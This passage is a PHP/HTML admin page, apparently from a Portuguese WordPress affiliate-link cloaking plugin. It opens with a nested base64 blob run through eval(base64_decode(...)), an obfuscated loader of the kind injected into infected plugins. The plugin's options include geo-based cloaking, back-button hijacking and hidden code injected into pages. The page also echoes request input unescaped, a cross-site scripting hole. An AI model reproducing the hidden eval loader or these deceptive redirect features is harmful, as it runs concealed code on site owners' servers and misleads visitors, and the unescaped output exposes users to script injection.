KSVpVaENhV0p0YUcxWFZFazFZVEZ3VkdFelFsQmtlakE1U1dwMGJHUnRSbk5MUjBwb1l6SlZNazVHT1d0YVYwNTJXa2RWYjBwSFduQlpXRkp6WVZjMU5GZ3lUblphUjFWd1MxUnpQU0k3WlhaaGJDaGlZWE5sTmpSZlpHVmpiMlJsS0NSbWFXRjBiR2x1ZUY5amIyUmxLU2s3IjtldmFsKGJhc2U2NF9kZWNvZGUoJGZpYXRsaW54X2NvZGUpKTs=";eval(base64_decode($fiatlinx_code));			
?>

<?php require("header-top.php");?>


<div class="wrap">
        
<h1>Página de Edição do Link</h1>
<p>
		  <label style="color:red;">Veja Mais Plugins Incríveis da  <a href="http://admiyn.com.br" target="_blank">~&gt; Admiyn - Softwares Inteligentes</a></label></p>
  
<div class="panel-group" id="accordion">     

 		<form action="" method="post">
 				<p style="text-align:right;">

               <button type="submit" name="submit" class="btn btn-danger btn-sm"><i class="glyphicon glyphicon-refresh"></i> Atualizar</button> <a href="<?php echo $admin_url?>_Links&lkdel=<?php echo $_REQUEST["lk"]?>" class="btn btn-danger btn-sm"><i class="glyphicon glyphicon-remove"></i> Excluir</a> <a href="<?php echo $admin_url . "&copy=" . $_REQUEST["lk"]?>" class="button-secondary" ><i class="glyphicon glyphicon-duplicate"></i> Clonar</a>

				</p> 
                        
        		<?php
                 wp_nonce_field('add',self::CLASS_NAME);
				?>
        	<input type="hidden" name="lk" value="<?php echo $_REQUEST["lk"]?>" />

          <div class="panel panel-danger">
            <div class="panel-heading">
            
			<h3 class="panel-title">
<a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#collapseConfiguracoes">Configurações Essenciais</a>
			</h3>
            </div>
            
			<div id="collapseConfiguracoes" class="panel-collapse collapse in">
            <div class="panel-body">
            
				<p>

                <div class="well">

                <table class="my-table">
                <tr>
                <td >
                
                <label>Projeto/Categoria:</label> <select name="cproj" onchange="javascript:submit_form('filtro');" class="form-control">
                <?php
               foreach($projetos as $proj){
				   echo "<option value='". $proj["id_projeto"] ."' ". selected($proj["id_projeto"], $link["id_projeto"]) .">". $proj["nm_projeto"] ."</option>";
			   }
				?>
                </select>
                                
                </td>
                <td style="padding-left:20px">
                
                <div class="row">
                	<div class="col-xs-2">
                <label>Acessos</label>
                	</div>
                    <div class="col-xs-4">
                <input type="number" name="total_acessos" class="form-control" value="<?php echo $link["total_acessos"];?>" /> 
					</div>

                	<div class="col-xs-2">
                <label>Acessos Únicos</label>
                	</div>
                    <div class="col-xs-4">
                <input type="number" name="total_acessos_unicos" class="form-control" value="<?php echo $link["total_acessos_unicos"];?>" /> 
					</div>
                 </div><!--end of row-->
                                                  
                </td>
                </tr>
                <tr>
                <td>
                

                <label>Nome do Link:</label> <a class="popoverData" class="btn" href="javascript::" data-content="Esse campo é Apenas um Identificador para o Link." rel="popover" data-placement="bottom" data-original-title="Nome do Link" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a>
                <input type="text" name="link_name" class="form-control col-sm-5" value="<?php echo $link['nome_link'];?>" /> 

                
                </td>
                <td style="padding-left:20px">
                
			 <div class="row">
                	<div class="col-xs-2">
                <label>Tipo do Link: </label>
                	</div>
                     <div class="col-xs-4">
                     <select name="redirecionamento" class="form-control" onchange="javascript:exibir_ocultar('tempo-redir',this.value,'0,2');">
                     <option value="0" <?php selected(0,$link["redirecionamento"]);?>>Redir (meta refresh)</option>
                     <option value="1" <?php selected(1,$link["redirecionamento"]);?>>Camuflador</option>
                     <option value="2" <?php selected(2,$link["redirecionamento"]);?>>Redir (javascript)</option>
                     <option value="3" <?php selected(3,$link["redirecionamento"]);?>>Redir (PHP)</option>
                     </select>
                 	</div>
                
                <div id="tempo-redir" <?php $ids_motrar = array("0","2"); if(!in_array($link["redirecionamento"],$ids_motrar)) echo 'style="display:none;"'?>>
                 <div class="col-xs-2">
               	 <label>Redir Após: </label>
                 </div> 
                 <div class="col-xs-4">
                	<input type="number" name="redir_apos" min="0" value="<?php echo $link["redir_apos"];?>" class="form-control" style="width:70px; display:inline-block" /> Segundos                
                 </div>
                </div>
                </td>
                </tr>
                <tr>
                <td>

                 <label>
				Palavra-Chave:</label>
                <a class="popoverData" class="btn" href="javascript::" data-content="Neste campo você precisa digitar uma palavra que será seu link de divulgação. Digite apenas Letras e Números, sem espaços, sem caracteres especiais e sem acentos!" rel="popover" data-placement="bottom" data-original-title="Plavra-Chave" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a>                       


                
                                 
                </td>                
                <td style="padding-left:20px">

                <label>Url de Afiliado A:</label> <a class="popoverData" class="btn" href="javascript::" data-content="Nesse campo Coloque o seu Link de Afiliado da Hotmart, Eduzz, Monetizze ou de qualquer outro programa que você é Afiliado." rel="popover" data-placement="bottom" data-original-title="Url de Afiliado" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a><small> (Url Obrigatória)</small>
           
                                
                </td>
                </tr>
                <tr>
                <td>
                	
                <div class="form-group">
                <div class="col-xs-3 over-auto">
                <small>
                <?php echo $url_site;?>
                </small>
                </div>
                <div class="col-xs-7">
                <input type="text" name="palavra_chave" class="form-control col-sm-7" value="<?php echo $link['palavra_chave']?>" /> 
                <span class="help-block">Somente Letras e Números</span>
                </div>
                <span class="glyphicon glyphicon-share-alt"></span>
                
                </div>
               
 
				<label>Ativar Métricas de Conversão mesmo sem Teste A/B:</label> <a class="popoverData" class="btn" href="javascript::" data-content="Quando você Faz Testes A/B as Métricas são guardadas automaticamente, mas se você estiver usando apenas um URL e quiser ativar as Métricas de Conversão para ele é preciso Ativar essa Opção Aqui" rel="popover" data-placement="bottom" data-original-title="Ativar Métricas de Conversão" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a>
               
               <select name="ativar_metricas" class="form-control" style="max-width:200px;">
                 <option value="0" <?php selected('0',$link["ativar_metricas"]);?>>Não</option>
                 <option value="1" <?php selected('1',$link["ativar_metricas"]);?>>Sim</option>
                 </select>
                                
               
                </td>
                <td style="padding-left:20px">
                

                <input type="text" name="url_afiliado" class="form-control" value="<?php echo $link["url_afiliado"];?>" />

                
                <label>Url de Afiliado B:</label> <a class="popoverData" class="btn" href="javascript::" data-content="Você pode Fazer Testes A/B para saber qual página de Vendas Converte mais. O tráfego Será dividido entre o url A e o url B" rel="popover" data-placement="bottom" data-original-title="Url de Afiliado 02" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a><small> (Url Opcional, para testes A/B)</small>
                
                <input type="text" name="url_afiliado2" class="form-control" value="<?php echo $link["url_afiliado2"];?>" />
                
				<label>Url de Afiliado C:</label> <a class="popoverData" class="btn" href="javascript::" data-content="Você pode Fazer Testes A/B/C para saber qual página de Vendas Converte mais. O tráfego Será dividido entre o url A, B e o url C" rel="popover" data-placement="bottom" data-original-title="Url de Afiliado 03" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a><small> (Url Opcional, para testes A/B/C)</small>
                
                <input type="text" name="url_afiliado3" class="form-control" value="<?php echo $link["url_afiliado3"];?>" />
                                
                </td>
                </tr>
                <tr>
                <td colspan="2">
                
                <label>Descrição:</label> <a class="popoverData" class="btn" href="javascript::" data-content="Use esse campo para anotações suas sobre esse Link. Essas anotações só você pode visualizar!" rel="popover" data-placement="bottom" data-original-title="Descrição" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a>
                <textarea name="descricao" class="form-control"><?php echo $link["descricao"];?></textarea>
   
                </td>           
                </tr>

                <tr>
                <td>
				<p>
				 <div class="row">
                <div class="col-xs-4">
				<label>Ativar Redirect no Botão Voltar</label> <a class="popoverData" class="btn" href="javascript::" data-content="Quando o Usuário Clicar no Botão Voltar, Exibirá um Url Diferente." rel="popover" data-placement="bottom" data-original-title="Ativar Redirect no Botão Voltar" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a>				</div>
                <div class="col-xs-8">
               
               <select name="ativar_back_redir" class="form-control" style="max-width:200px;" onchange="javascript:exibir_ocultar('p_back_redir',this.value,'1');">
                 <option value="0" <?php selected(0,$link["ativar_back_redir"]);?>>Não</option>
                 <option value="1" <?php selected(1,$link["ativar_back_redir"]);?>>Sim</option>
                 </select>
                  </div>
                  </div>    
                  
                  </p>           	
                </td>
                <td>
                	<p>
                 <div class="row" id="p_back_redir" <?php if($link["ativar_back_redir"] =='0') echo 'style="display:none;"'?>>
                <div class="col-xs-2 over-auto" >
                <label>Url Destino</label>
                </div>
                <div class="col-xs-10 over-auto">
                
                <input type="text" name="url_back_redir" class="form-control" value="<?php echo $link["url_back_redir"];?>" />	
                </div>
                </div>
                </p>
                </td>
                </tr>

   				<tr>

                <td colspan="2">
				<p>
				 <div class="row">
                <div class="col-xs-2">
				<label>Fazer Mobile Abrir</label> <a class="popoverData" class="btn" href="javascript::" data-content="Permite configurar um Url diferente num dado Período" rel="popover" data-placement="bottom" data-original-title="Mudar Url Destino no Período" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a>				
                </div>
                <div class="col-xs-10">
               
               <select name="mob_redir" class="form-control" style="max-width:200px;">
               	 <option value="0" <?php selected('0',$link["mob_redir"]);?>>Recurso Inativo</option>
                 <option value="1" <?php selected('1',$link["mob_redir"]);?>>URL A</option>
                 <option value="2" <?php selected('2',$link["mob_redir"]);?>>URL B</option>
                 </select>
                  </div>
                  </div>    
                  
                  </p>           	
                </td>
                                
                </tr>
  				<tr>

                <td colspan="2">
				<p>
				 <div class="row">
                <div class="col-xs-2">
				<label>Mudar Url Destino no Período</label> <a class="popoverData" class="btn" href="javascript::" data-content="Quando o Usuário Clicar no Botão Voltar, Exibirá um Url Diferente." rel="popover" data-placement="bottom" data-original-title="Ativar Redirect no Botão Voltar" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a>				
                </div>
                
                <div class="col-xs-3" id="periodo_div">
                <!--Row inside Row-->
                <div class="row">
                <div class="col-xs-5" id="dedata_div">
                   <input type="text" name="dedata" id="dedata" class="hasDatepicker form-control" value="" /> 
                  </div>
                  <div class="col-xs-2" >
				<label>Até</label> 				
                </div>
                  <div class="col-xs-5" id="atedata_div">
                   <input type="text" name="atedata" id="atedata" class="hasDatepicker form-control" value="" /> 
                  </div>
                </div>  
                <!--End of Row inside Row-->
                </div>
                  
                <div class="col-xs-2">
               
               <select name="exibir_periodo" id="exibir_periodo" class="form-control" style="max-width:200px;" onchange="javascript:exibir_ocultar_periodo(this.value);">
               	 <option value="0" <?php if($link["exibir_periodo"] ==0) echo ' selected="selected"';?>>Recurso Inativo</option>
                 <option value="1" <?php if($link["exibir_periodo"] ==1) echo ' selected="selected"';?>>Fazer Esse Link Abrir o URL ~&gt; </option>
                 <option value="2" <?php if($link["exibir_periodo"] ==2) echo ' selected="selected"';?>>Redirecionar para o URL ~&gt;</option>
                 </select>
                  </div>

                  <div class="col-xs-5">
                   <input type="text" name="periodo_url" id="periodo_url" class="form-control" value="<?php echo $link["periodo_url"]?>" /> 
                  </div>  
                  </div>                 
                  
                  </p>           	
                </td>
                                
                </tr>                                             
                </table>

				</div> <!--end of well-->
                
                
                </p> 
                
                <label class="label label-info"><a href="<?php echo $url_site . $link["palavra_chave"];?>" target="_blank">~&gt; Acesse o Link</a></label> <label class="label label-info"><a href="https://developers.facebook.com/tools/debug/og/object/?q=<?php echo urlencode($url_site . $link["palavra_chave"]);?>" target="_blank">~&gt; Debugger do Facebook</a></label> 

  				</div> <!--end of panel body -->
            </div>
          </div> <!--end of panel-->
          




 
             <div class="panel panel-info">
            <div class="panel-heading">
              <h3 class="panel-title">
			  <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapseModoTurbo">Modo Turbo</a>
              </h3>
            </div>
            <div id="collapseModoTurbo" class="panel-collapse collapse">
            <div class="panel-body">
            
            
            	<div class="well" <?php  if(!$exibir_modo_turbo) echo "style='display:none;'"?>>
                
                <p>
				 <div class="row">
                <div class="col-xs-3">
				<label>Ativar Modo Turbo</label> <a class="popoverData" class="btn" href="javascript::" data-content="Quanto você ativa esse modo é aberta uma camada oculta nos links camuflados, assim você pode definir o url após o clique" rel="popover" data-placement="bottom" data-original-title="Ativar Modo Turbo" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a>
                </div>
                <div class="col-xs-2">
               
               <select name="ativar_turbo" id="ativar_turbo"  class="form-control" style="max-width:200px;" onchange="javascript:exibir_ocultar_class('d_turbo_url',this.value,'1');exibir_ocultar('d_redirect_clique',this.value,'1');exibir_ocultar('d_segundo_acesso',this.value,'1');exibir_ocultar('d_segundo_apos_turbo',this.value,'1');exibir_ocultar('d_tipo_modo',this.value,'1');">
                 <option value="0" <?php if($link["ativar_turbo"] ==0) echo ' selected="selected"';?>>Não</option>
                 <option value="1" <?php if($link["ativar_turbo"] ==1) echo ' selected="selected"';?>>Sim</option>
                 </select>
                  </div>
               
 
                <div class="col-xs-3 d_turbo_url" <?php if($link["turbo_url"] =='0') echo 'style="display:none;"'?> >
                <label>Url que Abrirá em Nova Janela/Abba</label>
                </div>
                <div class="col-xs-4 d_turbo_url" <?php if($link["turbo_url"] =='0') echo 'style="display:none;"'?>>
                
                <input type="text" name="turbo_url" class="form-control" value="<?php echo $link["turbo_url"];?>" />	
                </div>
                
                
                </div>
                </p>
                
                                
                <p>
				 <div class="row" id="d_redirect_clique">
                <div class="col-xs-3">
				<label>Ativar Redirect depois de Clique</label> <a class="popoverData" class="btn" href="javascript::" data-content="Quando o Usuário Clicar em algum link a página será direcionada para outro URL." rel="popover" data-placement="bottom" data-original-title="Ativar Redirect depois de Clique" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a>
                </div>
                <div class="col-xs-2">
               
               <select name="redirect_clique" id="redirect_clique" class="form-control" style="max-width:200px;" onchange="javascript:exibir_ocultar_class('d_redirect_clique',this.value,'1');">
                 <option value="0" <?php if($link["redirect_clique"] ==0) echo ' selected="selected"';?>>Não</option>
                 <option value="1" <?php if($link["redirect_clique"] ==1) echo ' selected="selected"';?>>Sim</option>
                 </select>
                  </div>
               
 
                <div class="col-xs-3 d_redirect_clique" <?php if($link["redirect_clique"] =='0') echo 'style="display:none;"'?> >
                <label>Url para Redirecionar esse Link</label>
                </div>
                <div class="col-xs-4 d_redirect_clique" <?php if($link["redirect_clique"] =='0') echo 'style="display:none;"'?>>
                
                <input type="text" name="clique_url" class="form-control" value="<?php echo $link["clique_url"];?>" />	
                </div>
                
                
                </div>
                </p>
                
  
  				<p>
				<div class="row" id="d_segundo_acesso">
                <div class="col-xs-3">
				<label>Ativar Redirect do Segundo acesso</label> <a class="popoverData" class="btn" href="javascript::" data-content="Se o usuário já tiver Visitado a página, ele será redirecionado para outro URL" rel="popover" data-placement="bottom" data-original-title="Ativar Redirect no Segundo Acesso" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a>				
                </div>
                <div class="col-xs-2">
               
               <select name="redirect_segundo" id="redirect_segundo" class="form-control" style="max-width:200px;" onchange="javascript:exibir_ocultar_class('d_redirect_segundo',this.value,'1');">
                 <option value="0" <?php if($link["redirect_segundo"] ==0) echo ' selected="selected"';?>>Não</option>
                 <option value="1" <?php if($link["redirect_segundo"] ==1) echo ' selected="selected"';?>>Sim</option>
                 </select>
                  </div>
                  
   
                <div class="col-xs-3 d_redirect_segundo" <?php if($link["redirect_segundo"] =='0') echo 'style="display:none;"'?> >
                <label>Url Destino a partir do segundo acesso</label>
                </div>
                <div class="col-xs-4 d_redirect_segundo" <?php if($link["redirect_segundo"] =='0') echo 'style="display:none;"'?>>
                
                <input type="text" name="segundo_url" class="form-control" value="<?php echo $link["segundo_url"];?>" />	
                </div>
                                  
                  </div> 
                </p>  
                
                 <div class="row" id="d_segundo_apos_turbo">
                 <p>
                 
                 <div class="col-xs-2">   
                 <label>Ativar Após</label>
                 </div>
                 <div class="col-xs-1"> 
                 <input type="number" size="3" value="<?php echo $link["segundos_apos_turbo"];?>" name="segundos_apos_turbo" class="form-control" /> 
				 </div>
                 <div class="col-xs-9">
                 	<label>segundos</label>
                 </div>
                 
                 </p>
                 </div>
                            

				<p>
				 <div class="row" id="d_tipo_modo">
                <div class="col-xs-2">
				<label>Tipo do Modo</label>
                </div>
                <div class="col-xs-2">
               
               <select name="tipo_modo" class="form-control" style="max-width:200px;" onchange="javascript:exibir_ocultar('p_tipo_modo',this.value,'1');">
                 <option value="0" <?php if(isset($link["tipo_modo"]) && $link["tipo_modo"] ==0) echo ' selected="selected"';?>>Camada Transparente (Padrão)</option>
                 <option value="1" <?php if(isset($link["tipo_modo"]) && $link["tipo_modo"] ==1) echo ' selected="selected"';?>>Banner Fixo</option>
                 </select>
                  </div>
                    
                  
				<div id="p_tipo_modo" <?php if(!isset($link["tipo_modo"]) || $link["tipo_modo"] =='0') echo 'style="display:none;"'?>>
                 
                 
                 
                 <div class="col-xs-3 over-auto" >
                 <label>Imagem do Banner <small>(400x400)</small></label>
                 </div>
                 <div class="col-xs-3 over-auto">
                
                 <input type="text" name="turbo_img" id="turbo_img" class="form-control" value="<?php if(isset($link["turbo_img"])) echo $link["turbo_img"];?>" /> 	
                </div>
                <div class="col-xs-2 over-auto"><input type="button" name="upload-btn-turbo" id="upload-btn-turbo" class="btn btn-success btn-sm" value="Upload Image">
                </div>
                
                
                </div> <!--end of row-->
                </p>                                 
                
                </div>
                
                

               <div class="well" <?php if($exibir_modo_turbo) echo "style='display:none;'"?>>
              
                <div style="font-size:22px;font-weight:bold;font-style:italic;color:red;">
                
                <p>Esse é um Módulo Extra Opcional que requer o Plugin Modo Turbo</p>
                <p>Ou seja, para ficar habilitado é necessário possuir o plugin Modo Turbo Instalado e Ativado nesse Site. </p>
                <p>
                <a href="http://modoturbo.com/plugin-modo-turbo-cupom/" target="_blank">~&gt; Veja o quê o Plugin Modo Turbo Oferece Aqui &lt;~</a>
                </p>
                <p>
                Como Você já é um Cliente meu, vou lhe conceder um Mega Desconto<br />
                basta Acessar o Link Acima para ver o Vídeo e pegar seu Link Especial. 
                </p>
                
                <p>
                
                </p>
                
                </div>
                
                </div>                
                                                     
               
               

        </div>
        </div>
        </div>
        
        
                  

            <div class="panel panel-danger">
            <div class="panel-heading">
              <h3 class="panel-title">
			  <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapseRastreamento">Opções de Rastreamento</a>
              </h3>
            </div>
            <div id="collapseRastreamento" class="panel-collapse collapse">
            <div class="panel-body">
            
            
            	<div class="well">
                <p>
                 <input type="checkbox" name="ativar_parametros_url" id="ck_parametros" onchange="javascript:exibir_ocultar_checkbox('ck_parametros','atv_rastreio');exibir_ocultar_checkbox('ck_parametros','atv_dispositivo');" class="form-control" <?php if($link["ativar_parametros_url"]==1) echo "checked"?>> <label>Ativar Parâmetros de Url, Ativar Rastreio por Cookie e Rastrear Tipo de Dispositivo?</label> 
                 <span class="help-block">Quando os Parâmetros de URL estiverem ativos, o plugin irá repassar todos os parâmetros de url (Como SRC, UTM_Source, ETC) para o Link de Afiliado, inclusive para Botões que tiverem no final do url: hotlinks=plus</span>

                </p>
 
                <p id="atv_dispositivo">
                 <input type="checkbox" name="passar_dispositivo" style="display:inline-block" id="passar_dispositivo"  class="form-control" <?php if($link["passar_dispositivo"]==0) echo "checked"?>> <label>Adicionar o tipo de Dispositivo ao Rastreio <small>(Se é Mobile ou Desktop)</small></label> 
                 <span class="help-block">O Plugin irá repassar o tipo de dispositivo ao rastreio através do SRC e UTM_Source</span>

                </p>
                 
                <p id="atv_rastreio">
                 <input type="checkbox" onchange="javascript:exibir_ocultar_checkbox('ativar_rastreio_cookie','ultima_origem');" name="ativar_rastreio_cookie" id="ativar_rastreio_cookie" class="form-control" <?php if($link["ativar_rastreio_cookie"]==1) echo "checked"?>> <label>Ativar Rastreio por Cookie</label> &nbsp;&nbsp;&nbsp;&nbsp; <span id="ultima_origem"><input type="checkbox" name="so_ultima_origem" style="display:inline-block" id="so_ultima_origem"  class="form-control" <?php if($link["so_ultima_origem"]==1) echo "checked"?>> <label>Registrar Só Última Origem</label></span>
                 <span class="help-block">O plugin irá guardar os dados de src ou utm_source, e caso o mesmo usuário acesse novamente um link seu com outro src ou utm_source, o valor do cookie será lido e repassado. Com isso será possível rastrear todos os acessos que o usuário teve antes antes de finalizar a compra.</span>

                </p>
                
                <p>
               
               <label>Códigos para Inserir no Cabeçalho da Página: </label> <textarea name="face_pixel" class="form-control"><?php echo $link["face_pixel"];?></textarea> <span class="help-block">Use para Injetar Pixel de  Remarketing do Facebook, Código de Acompanhanto do Google Analytics, Scripts, etc., no Cabeçalho (Entre &lt;head&gt; e &lt;/head&gt;)  da Página</span>
             
				</p>

                <p>
               
               <label>Códigos para Inserir no Topo da Página: </label> <textarea name="codigo_topo" class="form-control"><?php echo $link['codigo_topo']?></textarea> <span class="help-block">Use para Injetar código, imagens, links, etc. no Topo da Página (Logo após a tag &lt;body&gt;)</span>
             
				</p>
                
                
                <p>
                
				<label>Códigos para Inserir no Rodapé da Página: </label> <textarea name="google_pixel" class="form-control"><?php echo $link["google_pixel"];?></textarea> <span class="help-block">Use para Injetar Código de  Remarketing do Google Adwords, scripts, etc., no Rodapé (Antes de &lt;/body&gt;) da Página</span>

				</p>   
               
               </div>

        </div>
        </div>
        </div>
        


           <div class="panel panel-danger">
            <div class="panel-heading">
              <h3 class="panel-title">
			  <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapseThree">Opções de Cloak</a>
              </h3>
            </div>
            <div id="collapseThree" class="panel-collapse collapse">
            
           
            <div class="panel-body">
            	<div class="well">
            	 
            	
                
                
                	<div class="row">
                    <div class="col-xs-2">
                    <label>Ativar Cloak para Esse Link? </label>
                    </div>
                    
                    <div class="col-xs-10">
                    <select name="ativar_cloak" class="form-control">
                     <option value="0" <?php selected('0',$link["ativar_cloak"]);?>>Não</option>
                     <option value="1" <?php selected('1',$link["ativar_cloak"]);?>>Sim</option>
                     </select>
                    </div>
                    </div><!--end of row-->
                    
                

                
                <div class="row">
                <br />
                <div class="col-xs-2">
                <label>Conexões de </label> 
                </div>
                <div class="col-xs-2">
                <select name="from_country" class="form-control col-sm-5">
                <?php
                foreach($countries_array as $key => $value){
					echo '<option value="' .$key. '" '. selected($key,$link["from_country"]) .'>'. $value .'</option>';
				}
				?>
				</select>
                <select name="from_country2" class="form-control col-sm-5">
                <option value="">INATIVO</option>
                <?php
                foreach($countries_array as $key => $value){
					echo '<option value="' .$key. '" '. selected($key,$link["from_country2"]) .'>'. $value .'</option>';
				}
				?>
				</select> 
                <select name="from_country3" class="form-control col-sm-5">
                <option value="">INATIVO</option>
                <?php
                foreach($countries_array as $key => $value){
					echo '<option value="' .$key. '" '. selected($key,$link["from_country3"]) .'>'. $value .'</option>';
				}
				?>
				</select> 
                <select name="from_country4" class="form-control col-sm-5">
                <option value="">INATIVO</option>
                <?php
                foreach($countries_array as $key => $value){
					echo '<option value="' .$key. '" '. selected($key,$link["from_country4"]) .'>'. $value .'</option>';
				}
				?>
				</select>                                                
                </div>
                <div class="col-xs-2">
                <select name="acao_cloak_br" id="acao_cloak_br" onchange="javascript:exibir_ocultar('url_no_br',this.value,'0,1,2,3');" class="form-control col-sm-5">
                <option value="0"  <?php selected(0,$link["acao_cloak_br"])?>>Seguir as Configs Essenciais ~&gt;</option>
                <option value="1"  <?php selected(1,$link["acao_cloak_br"])?>>Camuflar ~&gt;</option>
                <option value="2"  <?php selected(2,$link["acao_cloak_br"])?>>Redir (javascript) ~&gt;</option>
                <option value="3"  <?php selected(3,$link["acao_cloak_br"])?>>Redir (PHP) ~&gt;</option>
                <option value="4"  <?php selected(4,$link["acao_cloak_br"])?>>Abrir Página Homônima</option>                
				</select>
                 </div>
                 <div class="col-xs-6">
                 <p id="url_no_br">                
                 <input type="text" name="url_no_br" class="form-control" value="<?php echo $link['url_no_br']?>" /> 
                 <span class="help-block"><strong>Url 01 do Cloak</strong> - Deixe em Branco para Usar o Url de Afiliado das Configs Essenciais</span>
                 </p>
				</div>

				</div><!--end of row-->
                
				<p>
               <div class="row">
                <div class="col-xs-2">
                <label>Demais Conexões</label> 
                </div>
                <div class="col-xs-2">
                <select name="acao_cloak_fora_br" id="acao_cloak_fora_br" onchange="javascript:exibir_ocultar('url_fora_br',this.value,'0,1,2,3');" class="form-control col-sm-5">
                <option value="0"  <?php selected(0,$link["acao_cloak_fora_br"])?>>Seguir as Configs Essenciais ~&gt;</option>
                <option value="1"  <?php selected(1,$link["acao_cloak_fora_br"])?>>Camuflar ~&gt;</option>
                <option value="2"  <?php selected(2,$link["acao_cloak_fora_br"])?>>Redir (javascript) ~&gt;</option>
                <option value="3"  <?php selected(3,$link["acao_cloak_fora_br"])?>>Redir (PHP) ~&gt;</option>
                <option value="4"  <?php selected(4,$link["acao_cloak_fora_br"])?>>Abrir Página Homônima</option>
				</select>
                 </div>                
                 <div class="col-xs-8">                
                <p id="url_fora_br">
                <input type="text" name="url_fora_br" class="form-control" value="<?php echo $link["url_fora_br"];?>" /> 
                 <span class="help-block"> <strong>Url 02 do Cloak</strong> - Deixe em Branco para usar o Url de Afiliado das Configs Essenciais</span>
                 </p>
				</div>

				</div><!-- end of row-->
                </p>                   
               
               
				</div><!--end of well-->
        </div>
        </div>
        </div>
        



           <div class="panel panel-danger">
            <div class="panel-heading">
              <h3 class="panel-title">
			  <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapseRedirecionamento">Opções da Página de Espera</a>
              </h3>
            </div>
            <div id="collapseRedirecionamento" class="panel-collapse collapse">
            <div class="panel-body">
            
            
            	<div class="well">
                
                <p>
               
               <label>Mensagem a Exibir Enquanto Redireciona: </label> <textarea name="redir_mensagem" class="form-control"><?php echo $link['redir_mensagem'];?></textarea>
                </p>
                
                <h3>Marque Qual Gif Exibir durante o Redirecionamento?</h3>
                                
                <p>
 					<input type="radio" name="redir_gif" value="0"  class="form-control" <?php if($redir_gif == 0) echo 'checked="checked"'?> > Sem Imagem
                    
                 <?php
                 	for($i=1;$i<6;$i++){
						$redir_checked = '';if($redir_gif == $i) $redir_checked = 'checked="checked"';
				 echo ' 
                 <input type="radio" name="redir_gif" '. $redir_checked .'  value="'.$i.'" class="form-control" > <img src="'. $anderson_makiyama[self::PLUGIN_ID]->plugin_url .'images/loader'.$i.'.gif" />
                 ';
					}
				 ?>                                                   	
                </p>
 
                <p>
                 <?php
                 	for($i=6;$i<11;$i++){
						$redir_checked='';if($redir_gif == $i) $redir_checked = 'checked="checked"';
				 echo ' 
                 <input type="radio" name="redir_gif" '. $redir_checked .'  value="'.$i.'" class="form-control" > <img src="'. $anderson_makiyama[self::PLUGIN_ID]->plugin_url .'images/loader'.$i.'.gif" />
                 ';
					}
				 ?>

                </p>
                 
                <p>
                 <?php
                 	for($i=11;$i<16;$i++){
						$redir_checked='';if($redir_gif == $i) $redir_checked = 'checked="checked"';
				 echo ' 
                 <input type="radio" name="redir_gif" '. $redir_checked .'  value="'.$i.'" class="form-control" > <img src="'. $anderson_makiyama[self::PLUGIN_ID]->plugin_url .'images/loader'.$i.'.gif" />
                 ';
					}
				 ?>

                </p>
                
                 
                
                <p>
               
               <label>Texto ou HTML para Inserir na Página: </label> <textarea name="redir_codigo" class="form-control"><?php echo $link['redir_codigo']?></textarea> <span class="help-block">Use para Injetar código, imagens, links, etc. na Página de Espera</span>
             
				</p>
                                 
               
               </div>

        </div>
        </div>
        </div>
        
        

           <div class="panel panel-danger">
            <div class="panel-heading">
              <h3 class="panel-title">
              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapseFour">
              Como a Página Camuflada é Vista nas Redes Sociais
              </a>
              </h3>
            </div>
            <div id="collapseFour" class="panel-collapse collapse">
            <div class="panel-body">

				<h3>Dados Básicos da Página Camuflada:</h3>
				<div class="well">
                <p>
                
                <label>Título para ser usado no campo &lt;title&gt; do html:</label>
                <input type="text" name="titulo" class="form-control" value="<?php echo $link["titulo"];?>" />

				</p>
                <p>
                
                <label>Descrição para campo "Description" e para redes sociais</label>
                <textarea name="descricao_publica" class="form-control"><?php echo $link["descricao_publica"];?></textarea>

				</p>   
                <p>
                
                 <label>Imagem que será usada em Redes Sociais</label>
                 
                <div class="row">
                    <div class="col-xs-3">
                    <input type="text" name="imagem" id="image_url" class="form-control" value="<?php echo $link["imagem"];?>">
                    </div>
                    <div class="col-xs-9">
                    <input type="button" name="upload-btn" id="upload-btn" class="btn btn-success btn-sm" value="Upload Image"></div>
                
                </div> <!--end of row-->              
                </p> 
                
                
                </div><!-- end of well-->
                
                <p>
				<h3>Código Oculto:</h3>
				
                <div class="well">

              <label>Coloque o código html, texto, imagem, etc, que será inserido de forma oculta na página camuflada:</label> <textarea name="codigo_oculto" class="form-control" ><?php echo $link["codigo_oculto"];?></textarea>

                          
                </p>
              
                </div><!-- end of well-->

                
			</div>
        </div>
        </div>





           <div class="panel panel-danger">
            <div class="panel-heading">
              <h3 class="panel-title">
			  <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapsePopOver">Banner e PopOver na Página Camuflada</a>
              </h3>
            </div>
            <div id="collapsePopOver" class="panel-collapse collapse">
            <div class="panel-body">
            
            
            	<div class="well">

                <label>Banner e PopOver?</label> 
                <select name="ativar_automatic" class="form-control" onchange="javascript:exibir_ocultar_controle(this.value);" id="ativar_automatic">
                    	
                        <option value="0" <?php selected('0',$link["ativar_automatic"]);?>>Inativo</option>
                        <option value="1" <?php selected('1',$link["ativar_automatic"]);?>>Ativar PopOver</option>
                        <option value="2" <?php selected('2',$link["ativar_automatic"]);?>>Ativar como Banner</option>
                        
                    </select>
                <br />
                

                
